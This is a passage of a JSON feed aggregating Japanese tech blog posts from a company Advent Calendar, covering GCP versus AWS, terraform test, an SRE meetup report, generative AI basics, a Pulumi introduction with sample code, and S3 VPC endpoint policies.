です。株式会社スリーシェイクでクラウド型データ連携ツール「Rec…","link":"https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a","isoDate":"2023-12-19T22:00:39.000Z","dateMiliSeconds":1703023239000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"AWS経験者がGCPに入門","contentSnippet":"この記事はGCP(Google Cloud Platform) Advent Calendar 202320日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。GCPは初心者ですが、スリーシェイクはGCPパートナー企業なので、しっかりキャッチアップして頑張ってまいります。今回の記事は、AWSは触ったことあるけど、GCPは初めてという私がGCPの印象や、AWSとGCPのマネージドサービスの対応などを、これから入門する方のためにも記しておきたいと思います。印象GCPを触ってみたり、ドキュメントを読んだり、Cloud Digital Leaderの試験勉強をしていく中で思ったことは、SREの考え方がよく出てくるということです。SRE（Site Reliability Engineering）はGoogle発祥ということもあり、Cloud Digital Leader模擬試験でもよく目にしました。また、AWSに比べると、Kubernetesもよく目にします。KubernetesはGoogle 内部で利用されているクラスタマネージャの Borg を元に 2014 年に開発されたこともあり、Kubernetes使うならGCPが一番というイメージです。それから、BigQueryは一般公開データセットもあり、GCPの強みというイメージです。入門書GCP入門のオススメ書籍として、社内ドキュメントに載っていた「図解即戦力　Google Cloudのしくみと技術がこれ1冊でしっかりわかる教科書」をKindle版で読んでいます。技術書はKindleで読みにくいものもありますが、これは読みやすく、GCPの概要を掴めるかと思います。AWSとの比較無料利用枠クラウドの使い始め、AWSは無料利用枠を超えると通常の課金が発生しますが、GCPは無料利用枠を超えるとサービスが使えなくなるため、課金される心配がありません。これはAzureもGCPと同様です。仮想マシンAWSではEC2インスタンスを立てますが、GCPはCompute Engineという名前です。「インスタンス」という言葉もAWSと同様に使います。ECSとCloud RunAWS上でコンテナを稼働させるマネージドサービス「Amazon Elastic Container Service」（ECS）ですが、GCPではCloud Runになるでしょうか。ECSのFargateがCloud Runに対応しているイメージです。Cloud Runは早速業務で使用していますが、ECSよりも管理が楽だという印象を受けました。サーバーレスAWSでお馴染みLambdaですが、GCPではApp Engineでしょうか。App Engineはスタンダード環境とフレキシブル環境があり、フレキシブル環境はSSH接続ができるとか！また、App EngineはBlue-Greenデプロイメントに基づいて行われるのですね！AnthosGCPでAnthosというサービス名もよく目にしますが、オンプレやAWSやAzureなど他のパブリッククラウドと接続してマルチクラウドが実現できるんですね。GKE(Google Kubernetes Engine)で統一したプラットフォームを構築するので、マルチクラウド、ハイブリッドクラウドが他のクラウドを拠点にするよりもやりやすいのではないでしょうか？最後にGCP初心者ですが、クラウド触るのは好きなので、習得していきたいと思います！初心者の記事ですが、読んでいただきありがとうございました！","link":"https://shu-kob.hateblo.jp/entry/2023/12/19/190734","isoDate":"2023-12-19T10:07:34.000Z","dateMiliSeconds":1702980454000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"terraform test: 細かい挙動","contentSnippet":"この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...","link":"https://zenn.dev/kyohei_saito/articles/eac62818b7217d","isoDate":"2023-12-18T14:58:00.000Z","dateMiliSeconds":1702911480000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"3-SHAKE SRE Tech Talk #8レポート（k8sの話もたくさん）","contentSnippet":"この記事はKubernetes Advent Calendar 202319日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。kubernetesは初心者ですが、Sreake事業部のSREとしてしっかりキャッチアップして頑張ってまいります。3-shake.connpass.comさて、12月18日に弊社の勉強会「3-shake SRE Tech Talk #8」が行われました。半分以上はKubernetesの話だったので、この勉強会の話題を書きたいと思います。↓開催中メモ代わりにX(旧Twitter)への自分の投稿はこちら（全部スレッドで連なっています）19時から弊社スリーシェイクの勉強会を開催します！お時間のある方は是非ご参加ください！https://t.co/wu271V6Pbw#SRETT— Shu Kobuchi(こぶシュー) (@shu_kob) 2023年12月18日   Xにて#SRETTで検索した投稿(最新)はこちら↓セッション毎に分けて、書いてます。スリーシェイク技術顧問 青山真也さん「KubeCon + CloudNativeCon NA 2023 Sessions for Site Reliability Engineers」最初はメインセッション。スリーシェイク技術顧問で、サイバーエージェントの青山真也さん「KubeCon + CloudNativeCon NA 2023 Sessions for Site Reliability Engineers」kubernetesユーザの方にはお馴染み、日本のkubernetesの第一人者の方です。↓スライドはこちら speakerdeck.com冒頭、ちらっとKubernetes完全ガイド第3版の話が進んでいるという「おお！」となるお話も！↑こちらは第2版です。k8sユーザのバイブルですよね。私も紙書籍版を持っています。楽しみですね！さて、セッションの内容としては、イベントのご紹介、参加者数の推移から、Keynoteで発表された2023年3月のDatadogの障害の話へ。全てのデータセンターで60%のnodeが1時間ダウンした大規模な障害だったそう。恐ろしいですね！！DatadogのK8sクラスタのnodeはUbuntu 22.04にVer. UP Rolloutをしていっているが、20.04と22.04の間にあった必要のないルーティングポリシーを消す変更があり、障害に繋がったとのことです。Auto Scalingが走って、救われた面もあるが、50%強のスケールアウトを一気にしようとすると課題も多々ありました。他人事ではなく、障害時に復旧するレベルでオートスケールを設計する必要がある、というのが教訓でした！二つ目のお話「OpenTelemetry」OpenTelemetryとは、Traceデータを収集するSDKで、YAMLで書くよりも、OTTLで書くと、コードの記述量が少なくて済むメリットも！PrometheusからOpenTelemetry Collectorに置き換えると、約1/5にリソース消費を抑えられるなどのメリットもあるそうです。ただし、Otelは多少バグがあるので使用上は注意とのことでした。他に、Argoの話もしてくださいました。Config Management Plugins(CMP)を使うと、HelmやKustomizeでない任意のツールでArgoCDと連携できるとのこと！青山さんのメインセッションの後は、6名の方のLT！社外の方3名、社内3名です。スリーシェイク高村さん「障害対応のススメ」 speakerdeck.com新人SREはエキスパートSREとペアで障害対応しよう！というお話。ペアで障害対応することにより、新人だけでなく、エキスパートSREも自分だけでは把握しきれない分も把握できます。「ペアプログラミング」ならぬ「ペア障害対応」いいですね！ポストモーテム作成も！私もスリーシェイクの一員として早くやってみたいですね！ペア障害で属人化解消というメリットもあります！incident-response.connpass.com「Incident Response Meetup vol.1」という良さげな勉強会もあるのとのこと！でした！mixi 清水さん「今年1年のEKS運用振り返り」 speakerdeck.commixiさんのサービス「みてね」はEKSを使用しているそうで、運用の苦労話も聞けました。OOMKilledが起こることもあり、CPU、メモリ等リソース調整しないといけないのは大変ですね。Railsアプリはメモリを食い、再起動かからないとメモリ消費が増えてくるそうです。定期的に再起動かけるようにして対応したそうです。手動運用でアップデートが放置されがちだった箇所も、自動アップデートもできるようにしたのはすごいですね。kubectlでPod作業するのを禁止したりだとか。その代わり踏み台からのアクセスできるようにしたり。k8s運用の勉強になりました。スリーシェイク bells17さん「KubernetesとCoreDNS」 speakerdeck.com自分もEKSでCoreDNSのステータス低下問題に悩まされたことがあったので、ありがたいお話でした。bells17さんお得意のK8sのコードリーディングでCoreDNSのロジックに迫っていってました。CoreDNSのデプロイからnameserverにIPアドレスを設定するまでの流れと、CoreDNSによるService/Podの名前解決を解説してもらいました。Kubernetes 側で定義されている DNS の仕様に従って、CoreDNS 側で Kubernetes 用の plugin が実装されてるとのこと。私もkubernetesの力をつけて、bells17さんの話を理解できるように頑張っていきます！ZLab yosshi_さん「Grafana Agent を用いた Continuous Profiling」qiita.comqiita.comGrafana Agentで eBPF が使われているそうです。eBPF だと kernel level で情報がとれるので、より詳細な情報を取れるのではないか、という期待があるとのことでした。Grafana Agentのgolang pullもあり、対象言語はGo言語のみで、取得対象はpprofの情報になるので、CPU以外にもメモリ等の情報も収集可能とのことでした。スリーシェイク まさすずさん「Terraform使いがPulumiに入門する」 speakerdeck.comTerraform(HCL)の記述力に限界を感じていたので、Pulumiを使い始めた。とのことでした。Pulumiとは任意のプログラミング言語でインフラ構築可能なプロビジョニングツールです。TerraformやAnsibleなどインフラのツールって柔軟性に欠けるので、任意のプログラミング言語で柔軟にインフラ構築できるのはいいですよね！Pulumi Cloudは個人で使う分には無料とのことでした！FLUX cstokuさん「へーしゃで起こったGoogle Cloud課金事故事例」Cloud Logging で Log Storage cost が爆増。ログレベル Debug でメッセージが出力されるバッチが (バグで) 何回も呼ばれるようになっていた、とのことでした。Cloud Loggingではログレベルに気をつけましょう！また、Cloud Storageにて、Archive時に大量課金事故が発生したそうです。これはArchiveで費用が嵩むのは仕方がないものの、想定できておらず、予算がつけれてなかったとのことでした。それから、BigQueryをTerraformでLogical StorageからPhysical Storageに変更しようとしたら、変更されておらず、Active Logical Strageでコスト増！原因はドキュメントに乗っていたクエリが間違っており、さらに、知らないうちに正しいものに更新されていた。という大変な思いも。ドキュメントも鵜呑みにはできないですね。課金事故勉強になりました！アンケート参加してくださった方ありがとうございました。アンケートのご記入にもご協力くださいm(._.)mdocs.google.comアーカイブ動画編集後、アーカイブ動画がアップロードされる予定です。YouTubeの3-SHAKEチャンネルをご登録の上、お待ちください。アドベントカレンダー次回へのバトンタッチKubernetes Advent Calendar 202312月20日はHiroshi Hayakawaさんの記事です。お楽しみに！","link":"https://shu-kob.hateblo.jp/entry/2023/12/18/234306","isoDate":"2023-12-18T14:43:06.000Z","dateMiliSeconds":1702910586000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"terraform test: 応用機能","contentSnippet":"この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...","link":"https://zenn.dev/kyohei_saito/articles/52ce184522aae9","isoDate":"2023-12-17T14:58:00.000Z","dateMiliSeconds":1702825080000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"AWS Step Functionsを利用してAWSリソースの自動起動停止を行う","contentSnippet":"概要本記事ではStep Functionsを利用して、AWSリソースを自動で起動停止する方法について記載します。主にコスト削減のために、開発環境を夜間停止するなどで利用することを想定しています。今回は以下のようなことを実施する方法について説明しま…","link":"https://qiita.com/ys1/items/21744f39676286b2c321","isoDate":"2023-12-17T14:55:57.000Z","dateMiliSeconds":1702824957000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Inplace pod vertical Scalingについて調べる","contentSnippet":"概要この記事ではKubernetes 1.27で新たに導入されたIn-place pod vertical Scalingに関して調べたことを共有しますIn-place pod vertical…","link":"https://qiita.com/ys1/items/2bd32750977960b7ef33","isoDate":"2023-12-17T14:53:50.000Z","dateMiliSeconds":1702824830000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"個人開発で要件定義、設計をした話","contentSnippet":"現在、個人開発で麻雀戦績管理アプリを作っていて、要件定義や設計について考えたことを共有したいと思います。GitHub ↓github.comなぜやったのか自分はWebエンジニアを目指している大学生ですが、まともなWebアプリを開発した経験がなく、フロントからインフラまでフルスタックで開発しようと思い立ちました。最初は何をするか手探りの状態でしたが、その「何をするのか」を定義するために要件定義、設計から始めました。何をやったのかGitHubにissueを作成し、やるべきことを明確化していきました。要件定義ここではアプリケーションの機能や、なぜそのような機能にするのかを箇条書きしていきます。この作業を通してやることとやらないことが明確化され、実装もうっすら浮かんできます。実際の要件定義は以下のような感じになりました。- ユーザーはまずサインアップする   - ユーザー名、パスワードを設定する      - ユーザー名は一意でないといけない   - ユーザの削除機能はデータ整合性が複雑になるので作らない - サインアップ済みのユーザーはログインをする   - ユーザー名、パスワードを入力- セッション管理をし、セッションが張られていたらログインを省略し、ユーザーホーム画面に入る。- 親ユーザーが部屋を作り、他のユーザーを登録していく   - 作成できる部屋は10部屋まで   - 親は参加のためのパスワードを設定する   - 子は親に部屋IDとパスワードを共有してもらう   - 3人以上いないと対局結果は登録できない、四麻は四人   - 部屋の削除機能も必要- 各部屋のホーム画面では各部屋での自分の戦績が表示される- オフラインで対局した点数結果とそのユーザーと何家かをアプリに登録する   - 点数結果だけでいいの？      - 毎回上がり役とかを登録してると、面倒くさいと思う   - 三麻も登録できるようにする。   - 点数の合計点を計算し、ユーザーの入力をチェックする   - 同点の場合は、東寄りが上位- 取り消し機能も必要   - 「対局」という粒度で削除できるようにする。これは点数とユーザを登録したひと塊。      - 間違えてもその「対局」を消し、また新しい「対局」を作ればいい - 自分または同じ部屋のユーザーの成績を確認できるようにする    - 平均順位   - 一位率   - 二位率   - 三位率   - 四位率   - とび率   - 対局数   - 平均得点   - 各項目のランキングも出す   - 「n局以上」で検索できるようにする- 対局の登録、削除のたびに個人成績を計算しなおすデータベース設計ER図を書きます。要件定義にあるように今回のアプリではユーザーのログイン機能や、そのユーザーが作成、参加する部屋、その部屋ごとの戦績など、テーブルが複雑にリレーションを張るので設計に入る前に整理することができます。ある程度機能を盛り込む予定の個人開発では必須でしょう。画面遷移画面遷移図を書きます。ページとその機能、ページ同士の遷移を定義します。ここで定義したことはすなわちユーザーアクションのすべてなので、ユーザーアクションごとのテストがしやすくなります。実際の画面遷移図↓以上のような要件定義、設計を行うことで、実装での手戻りが少なくなり、快適に実装ができました。これからアプリケーション自体はほとんど完成しているので、コンテナ化し、それをECSやCloud Runにデプロイし、運用していく予定です！","link":"https://kechigon.hatenablog.com/entry/2023/12/17/142140","isoDate":"2023-12-17T05:21:40.000Z","dateMiliSeconds":1702790500000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"生成AIについて学んだのでざっとアウトプット","contentSnippet":"はじめに3-shake Advent Calendar 2023シリーズ1、17日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。前職は暗号資産交換所で、AWS上でブロックチェーンフルノードやウォレット基盤の構築・運用を行なってきました。スリーシェイクではSreake事業部のSREとして、インフラをやりつつも、生成AI等のアプリケーション構築も行なっていく予定です。よろしくお願いいたします。生成AIをこれからやっていくにあたり、インプットした情報のアウトプットをしていきます。ポエムになりますが、ご了承くださいm(._.)m生成AIを触ってみるディープラーニング（深層学習）などを用いた従来のAIは基本的にデータの「分析」に使われてきましたが、生成AI（Generative AI）は文字通り「画像」や「テキスト」、「ソースコード」を生成します。2022年春頃からは、ユーザが入力したテキストを元に絵画を描く画像生成AIのサービスが数多く誕生し、2022年11月にベータ版がリリースされたChatGPTのリリースは世界的に注目を集め、今年2023年は生成AIがIT業界で注目の的となった一年でした。ChatGPTを使ったことがない方は無料版を使えますので、ぜひ使ってみましょう。私は以下の使い方をしてみました。私「私はIT企業でクライアントワークをするエンジニアです。顧客に提案するため、生成AIを使う事業企画書を出してください。」もちろんです。生成AIを活用した事業企画書は、顧客への提案を効果的に行うための素晴らしい手段です。以下は、そのような企画書の構成例です。まず、以下の項目を含めることが重要です。導入の背景と目的なぜ生成AIを導入する必要があるのか、それによって解決できる課題や得られるメリットを明確に説明します。生成AIの概要生成AIの基本的な機能や技術について説明し、どのように機能するのかを分かりやすく示します。ビジネスへの価値生成AIがビジネスに与える具体的な価値や影響について示します。例えば、時間の節約、コスト削減、品質向上、顧客満足度の向上などです。導入計画生成AIの導入に関する計画を示します。導入の段階、時間枠、費用、人員配置などを詳細に記載します。リスクと対策導入に伴うリスクや懸念点を列挙し、それに対する対策やリスク軽減策を提示します。成功事例や導入効果他社での成功事例や導入後の具体的な効果、改善された業績などを具体的な数字や事実を交えて提示します。サポートとトレーニング導入後のサポート体制や従業員へのトレーニングプログラムについて説明します。利用者が十分なサポートを受けられるように計画を立てます。導入後の運用と評価生成AIの導入後、どのように運用し、どのような指標で評価するのかを示します。これらの要素を含んだ事業企画書は、顧客に対して生成AIの導入がなぜ重要であるのかを説得力を持って伝えることができます。また、具体的な事例や効果を提示することで、顧客の興味を引きつけ、導入に対する理解を深めることができるでしょう。これだけ見ても、既存のチャットボットよりちゃんとした返しをしているのがお分かりいただけるでしょうか？コンピュータへの指示を「プロンプト」と言いますが、このプロンプトを具体的にすればするほど、AIの返答も精密になっていきます。プロンプトを適切に設計することを「プロンプトエンジニアリング」と言います。生成AIの得意不得意テキストを生成するのは得意ですが、算数・数学の文章題は意外にも苦手です。生成AIが言葉を理解（自然言語処理）するのに、単語の意味や相関性をベクトルを用いて、膨大な蓄積データから確率的に処理しているのですが、文章題もテキスト処理してしまうと文章を確率的に処理して、残念な結果になることも。膨大なデータの蓄積はしているものの、その中にないことには答えられません。例えば、ChatGPTで会社のことを聞くと知らないとのことでした。私「株式会社スリーシェイクについて教えてください。」申し訳ありませんが、2022年の情報までしか私のデータベースにはアクセスできません。そのため、特定の企業に関する最新の情報を提供することはできません。株式会社スリーシェイクについての情報は、公式ウェブサイトやニュース記事、ビジネスディレクトリ、または企業情報を提供するデータベースなどを確認することで最新の情報を入手できるかもしれません。お探しの情報が特定の業界やサービスに関連している場合は、その背景や提供しているサービスについて私がお手伝いできるかもしれません。どのような情報をお探しですか？生成AIをどうビジネスに活用するかまずはChatGPTに聞いてみました。私「生成AIを用いたビジネスアイデアを教えてください」生成AIを活用したビジネスアイデアはさまざまですが、いくつか例を挙げてみましょう。カスタマイズされたコンテンツの提供生成AIを使用して、個々のユーザーに合わせたカスタマイズされたコンテンツを提供するプラットフォームを開発する。例えば、ニュース記事、ブログ投稿、商品レコメンデーションなど。クリエイティブなコンテンツ生成ツール生成AIを活用したクリエイティブツールの開発。例えば、自動生成されたイメージ、デザイン、音楽、または詩の生成ツール。仮想アシスタントやカスタマーサポート会話型AIを活用した仮想アシスタントやカスタマーサポートの提供。顧客とのインタラクションを自動化し、サポート体制を向上させる。製品開発やデザインの支援生成AIを使って、新しい製品のアイデアやデザインの提案を行うツールやプラットフォームを提供。アイデアのブレストや設計プロセスを支援する。自動化されたレポートや分析生成AIを利用して、データ分析やレポート作成を自動化するツール。ビジネスのデータを解釈し、洞察を提供する。これらのアイデアは、生成AIの力を活用して新しいビジネスモデルやサービスを展開する可能性を示しています。AI技術を利用することで、効率性の向上や顧客体験の向上など様々なメリットを生み出すことができます。このように出てきました。ChatGPTだけを使うのであれば、個人が補助的に使用し、生産性を高めていくことはできますが、社内で生成AIを用いたアプリケーションを導入するとなると、業務分析をし、業界や各社の業務に合わせたプロダクトが必要になってくるかと思いました。参考資料生成AIのまとまった知識を頭に入れておこうと思い、ビジネス書を一読しました。小林雅一 著「生成ＡＩ――「ChatGPT」を支える技術はどのようにビジネスを変え、人間の創造性を揺るがすのか？」ダイヤモンド社生成AIに関するビジネス書は数多く出ていて、他のは読んでませんが、読むとしたらご自分にあったのを読むといいと思います。生成AIについて知った後、じゃあビジネスに導入するのはどうすればいいのか？と悩むことになると思いますが、このブログ書いている最中にググったら、以下の書籍が良さげです。（早速Kindle版をポチりました）小澤健祐(おざけん)著「生成AI導入の教科書」ワン・パブリッシング3-shake Advent Calendar 2023シリーズ1、3日目には橋本さんがAI何も知らないSREがGenerative AIで何ができるか考えた in 2023を書いています。こちらもぜひお読みください。スリーシェイクの生成AIの取り組みスリーシェイクでは、Google Cloud向けの生成AIスターターパックというパッケージングサービスを提供しています。sreake.comまた、生成AIを用いたアプリケーション開発、インフラ基盤構築も行います。以下からお問い合わせください。sreake.comアドベントカレンダー翌日の予告12月18日の3-shake Advent Calendar 2023は以下の通りです！シリーズ1は、林愛子さん「5,000円以下で選ぶ！今年のトレンド「ノームコア」をおさえたメンズコーデ3選。」シリーズ2は、@kiyos_1207 さん「terraform test: 応用機能」明日もお楽しみに！","link":"https://shu-kob.hateblo.jp/entry/2023/12/17/005138","isoDate":"2023-12-16T15:51:38.000Z","dateMiliSeconds":1702741898000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"terraform test: 基本機能","contentSnippet":"この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...","link":"https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97","isoDate":"2023-12-16T14:58:00.000Z","dateMiliSeconds":1702738680000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"Terraform使いがPulumiに入門しました","contentSnippet":"この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from \\"@pulumi/pulumi\\";import * as aws from \\"@pulumi/aws\\";import * as awsx from \\"@pulumi/awsx\\";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket(\\"my-bucket\\");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from \\"@pulumi/aws\\";import * as terraform from \\"@pulumi/terraform\\";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference(\\"network\\", {    backendType: \\"local\\",    path: \\"/path/to/terraform.tfstate\\",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput(\\"vpc_id\\");const publicSubnetIds = networkState.getOutput(\\"public_subnet_ids\\");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: \\"ami-7172b611\\",        instanceType: \\"t2.medium\\",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。","link":"https://blog.masasuzu.net/entry/2023/12/16/000000","isoDate":"2023-12-15T15:00:00.000Z","dateMiliSeconds":1702652400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"sbt-github-acitons を使った CI の構築とプロジェクトの publish について","contentSnippet":"この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...","link":"https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4","isoDate":"2023-12-15T03:00:00.000Z","dateMiliSeconds":1702609200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴","contentSnippet":"状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    \\"Version\\": \\"2012-10-17\\",    \\"Statement\\": [        {            \\"Effect\\": \\"Allow\\",            \\"Principal\\": \\"*\\",            \\"Action\\": \\"s3:*\\",            \\"Resource...","link":"https://zenn.dev/toshikish/articles/e846fa0c3de10f","isoDate":"2023-12-14T22:00:00.000Z","dateMiliSeconds":1702591200000,"authorName":"toshikish","authorId":"toshikish"},{"title":"拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ","contentSnippet":"※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...","link":"https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f","isoDate":"2023-12-14T15:31:58.000Z","dateMiliSeconds":1702567918000,"authorName":"seno","authorId":"seno"},{"title":"Karpenter を Amazon EKS 